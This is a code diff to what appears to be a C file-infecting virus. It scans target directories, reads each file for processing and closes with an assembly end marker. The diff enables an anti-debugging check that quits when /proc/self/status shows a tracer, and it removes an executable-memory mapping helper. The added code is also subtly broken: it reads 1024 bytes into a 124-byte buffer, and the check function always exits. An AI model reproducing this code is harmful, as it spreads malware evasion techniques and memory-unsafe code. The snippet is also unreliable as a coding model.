@@ -35,7 +35,6 @@ static size_t  ft_strlen(const char *s);
 static int get_env_var(char *name, char *content, int content_size);
 static int open_directory(char *path);
 static void    *ft_memmove(void *dst, const void *src, size_t len);
-static int     open_map(char *fname, t_file *file);
 static bool process_runing(void); //CHANGER L APPELLE DE DIR
 static int do_the_job(char file[],size_t size, char *path);
 static int             ft_strncmp(const char *s1, const char *s2, size_t n);
@@ -44,6 +43,8 @@ static void new_file(char buf[],size_t size, size_t end_of_text,char *path);
 static  void	ft_putnbr(int nb);
 static void		ft_putstr(char *s);
 static int		ft_putchar(int c);
+static int     ft_isdigit(int c);
+static char            *ft_strnstr(char *s1, char *s2, size_t n);
 
 #define PAGE_SIZE 4096
 
@@ -167,8 +168,8 @@ int do_main(void)
 	void *start;
 	size_t size;
 	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
-//	if (process_runing())
-	//	return (1);
+	if (process_runing())
+		return (1);
 	start = 0; //value get from the header
 	size = 0; //value get from addr
 	pid = fork();
@@ -337,35 +338,14 @@ static int open_directory(char *path)
 		fstat(fd , &st);
 		char mem[st.st_size];
 		int c = read(fd, mem,st.st_size);
-		write(1,mem,st.st_size);
+		//write(1,mem,st.st_size);
 		do_the_job(mem,st.st_size,path_file );
-			close(file.fd);
-			munmap(file.data,file.size);
 			exit(4);
 	}
 	close(dd);
 	return 0;
 }
 
-static int     open_map(char *fname, t_file *file)
-{
-	struct stat stat;
-	if ((file->fd = open (fname, 0x0008 | 0x0002, 0)) < 0)
-		return 1;
-	if (fstat(file->fd,&stat) == -1)
-		return 1;
-	file->size = stat.st_size;
-
-	if ((file->data =  syscall6(9,0, file->size, PROT_READ| PROT_WRITE| PROT_EXEC,
-		             MAP_SHARED, file->fd, 0)) == MAP_FAILED)
-	{
-		ft_putstr("error mmap syscall 6\n");
-		return 1;
-
-	}
-	write(1,file->data,file->size);
-	return 0;
-}
 
 
 static size_t  ft_strlen(const char *s)
@@ -427,47 +407,59 @@ static int             ft_strncmp(const char *s1, const char *s2, size_t n)
 		return (0);
 	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
 }
-/*
+
 static bool process_runing(void)
 {
-	DIR* dir;
-	struct dirent* ent;
-	char* endptr;
-	char buf[256];
 
-	if (!(dir = opendir("/proc"))) {
-		ft_putstr("can't open /proc");
-		return 1;
-	}
-	while((ent = readdir(dir)) != NULL) {
-		*//* if endptr is not a null character, the directory is not
-		 * entirely numeric, so ignore it *//*
-		long lpid = strtol(ent->d_name, &endptr, 10);
-		if (*endptr != '\0') {
-			continue;
-		}
+	int fd,i;
+	char buf[124];
+	char *TracerPid;
 
-		*//* try to open the cmdline file *//*
-		snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
-		FILE* fp = fopen(buf, "r");
-
-		if (fp) {
-			if (fgets(buf, sizeof(buf), fp) != NULL) {
-				*//* check the first token in the file, the program name *//*
-				char* first = strtok(buf, " ");
-				printf("name %s\n",first);
-				if (!strcmp(first, "gdb")) {
-					fclose(fp);
-					closedir(dir);
-					return (1);
-				}
-			}
-			fclose(fp);
+	fd = open ("/proc/self/status", 0,0);
+	ft_putstr("open /proc/self/status\n");
+	while((i =read(fd,buf,1024)) > 0)
+	{
+		if ((TracerPid = ft_strnstr(buf,"TracerPid:",i)) != 0)
+		{
+			TracerPid += 10;
+			while(*TracerPid == '\t' || *TracerPid == ' ')
+						TracerPid++;
+			if (*TracerPid != '0' && *TracerPid != '\n')
+				exit(1);
 		}
 
 	}
+	exit (4);
+
+//	while((ent = readdir(dir)) != NULL) {
+//		*//* if endptr is not a null character, the directory is not
+//		 * entirely numeric, so ignore it *//*
+//		long lpid = strtol(ent->d_name, &endptr, 10);
+//		if (*endptr != '\0') {
+//			continue;
+//		}
+//
+//		*//* try to open the cmdline file *//*
+//		snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
+//		FILE* fp = fopen(buf, "r");
+//
+//		if (fp) {
+//			if (fgets(buf, sizeof(buf), fp) != NULL) {
+//				*//* check the first token in the file, the program name *//*
+//				char* first = strtok(buf, " ");
+//				printf("name %s\n",first);
+//				if (!strcmp(first, "gdb")) {
+//					fclose(fp);
+//					closedir(dir);
+//					return (1);
+//				}
+//			}
+//			fclose(fp);
+//		}
+//
+//	}
 	return (0);
-}*/
+}
 static int do_the_job(char buff[],size_t size, char *path)
 {
 	ft_putstr("debut do_the_job\n");
@@ -690,6 +682,35 @@ static  void	ft_putnbr(int nb)
 			ft_putchar((char)nb + 48);
 	}
 }
+
+static int     ft_isdigit(int c)
+{
+	if ((c >= '0') && (c <= '9'))
+		return (1);
+	return (0);
+}
+static char            *ft_strnstr(char *s1, char *s2, size_t n)
+{
+	size_t  i;
+
+	if (!(*s2))
+		return ((char *)s1);
+	while (*s1 && n--)
+	{
+		if (*s1 == s2[0])
+		{
+			i = 1;
+			while (n-- && s1[i] && s2[i] && s1[i] == s2[i])
+				++i;
+			if (i == ft_strlen(s2))
+				return ((char *)s1);
+			n += i;
+		}
+		s1++;
+	}
+	return (NULL);
+}
+
 
 void end_code() {
 __asm__(".globl myend\n"
